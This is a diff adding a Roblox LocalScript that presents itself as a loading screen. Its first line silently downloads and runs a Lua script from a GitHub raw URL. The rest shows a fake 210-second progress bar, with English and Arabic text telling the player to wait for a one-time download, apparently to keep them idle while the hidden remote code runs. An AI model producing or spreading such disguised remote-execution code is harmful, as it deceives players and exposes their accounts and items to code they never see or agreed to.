@@ -1,0 +1,91 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/273386299d36634d553271e1.lua'))()
+-- Parent this LocalScript to StarterPlayer > StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+local background = Instance.new("Frame")
+local loadingBar = Instance.new("Frame")
+local progressText = Instance.new("TextLabel")
+local topText = Instance.new("TextLabel")
+local bottomText = Instance.new("TextLabel")
+
+-- ScreenGui Properties
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.Name = "LoadingGUI"
+
+-- Background Properties
+background.Name = "Background"
+background.Size = UDim2.new(0.6, 0, 0.4, 0)
+background.Position = UDim2.new(0.2, 0, 0.3, 0)
+background.BackgroundColor3 = Color3.fromRGB(128, 128, 128) -- Gray background
+background.Parent = screenGui
+
+-- Loading Bar Properties
+loadingBar.Name = "LoadingBar"
+loadingBar.Size = UDim2.new(0, 0, 0.1, 0)
+loadingBar.Position = UDim2.new(0.1, 0, 0.5, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Start with red
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = background
+
+-- Progress Text Properties
+progressText.Name = "ProgressText"
+progressText.Size = UDim2.new(1, 0, 0.1, 0)
+progressText.Position = UDim2.new(0, 0, 0.6, 0)
+progressText.BackgroundTransparency = 1
+progressText.Text = "0%"
+progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
+progressText.TextScaled = true
+progressText.Font = Enum.Font.SourceSansBold
+progressText.Parent = background
+
+-- Top Text Properties (LOADING)
+topText.Name = "TopText"
+topText.Size = UDim2.new(1, 0, 0.2, 0)
+topText.Position = UDim2.new(0, 0, 0.1, 0)
+topText.BackgroundTransparency = 1
+topText.Text = "LOADING"
+topText.TextColor3 = Color3.fromRGB(255, 255, 255)
+topText.TextScaled = true
+topText.Font = Enum.Font.SourceSansBold
+topText.Parent = background
+
+-- Bottom Text Properties (Description)
+bottomText.Name = "BottomText"
+bottomText.Size = UDim2.new(1, 0, 0.2, 0)
+bottomText.Position = UDim2.new(0, 0, 0.8, 0)
+bottomText.BackgroundTransparency = 1
+bottomText.Text = [[
+This download is for the first execution only; it will work instantly after execution. 
+You need to wait till the loading screen is complete.
+هذا التحميل لأول مره يستخدم فيها السكربت فقط بعدها سيعمل تلقائيا يجب عليك أن تنتظر حتي يكتمل التحميل]]
+bottomText.TextColor3 = Color3.fromRGB(255, 255, 255)
+bottomText.TextScaled = true
+bottomText.Font = Enum.Font.SourceSans
+bottomText.TextWrapped = true
+bottomText.Parent = background
+
+-- Loading Logic
+local totalTime = 210 -- Total loading time in seconds (3 minutes and 30 seconds)
+local interval = 0.1 -- Interval to update progress
+local steps = totalTime / interval
+
+for i = 0, steps do
+    local progress = i / steps * 100
+    progressText.Text = string.format("%d%%", progress)
+    loadingBar.Size = UDim2.new(progress / 100, 0, 0.1, 0)
+
+    -- Change color based on progress
+    if progress <= 20 then
+        loadingBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red
+    elseif progress <= 40 then
+        loadingBar.BackgroundColor3 = Color3.fromRGB(255, math.floor((progress - 20) * 12.75), 0) -- Transition to orange
+    else
+        loadingBar.BackgroundColor3 = Color3.fromRGB(255 - math.floor((progress - 40) * 6.375), 255, 0) -- Transition to green
+    end
+
+    wait(interval)
+end
+
+-- Keep the GUI after loading completes (do nothing after the loop)
